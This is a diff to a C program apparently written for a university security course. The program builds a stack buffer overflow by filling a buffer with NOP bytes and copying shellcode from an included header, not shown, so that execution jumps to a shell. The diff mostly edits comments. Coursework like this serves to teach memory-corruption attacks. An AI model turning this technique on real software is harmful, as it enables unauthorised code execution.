@@ -1,5 +1,5 @@
 
-/* overflowBuffer.c   CSC348/648  10/6/2014                      */  
+/* overflowBuffer.c   CSC348/648                                 */  
 /* This program will jump to the shell code by copying the       */  
 /* contents of largeString into the variable buffer              */  
 /*                                                               */  
@@ -7,8 +7,7 @@
 #include<stdio.h>  
 #include<string.h>  
 #include"amdshellcode.h"  
-
-/* change the next line to appropriate buffer size               */  
+ 
 #define BUFFER_SIZE 144         //buffer size is distance between largeString memory
                                 //value and the return value, plus 8 bytes
 
@@ -24,8 +23,7 @@ void function()
 	/* Initialize buffer with 0x90 (NOP instruction)              */
 	memset(&largeString, 0x90, BUFFER_SIZE);   //clear the memory so errors don't occur
 
-	/* You need to fill largeString with appropriate contents     */
-	/* have fun...                                                */
+	/* Fill largeString with appropriate contents                 */
 	for(i = 0; i < strlen(amdshellcode); i++) {   //loop to copy characters from
 		largeString[i] = amdshellcode[i];     //amdshellcode to largeString
 	}
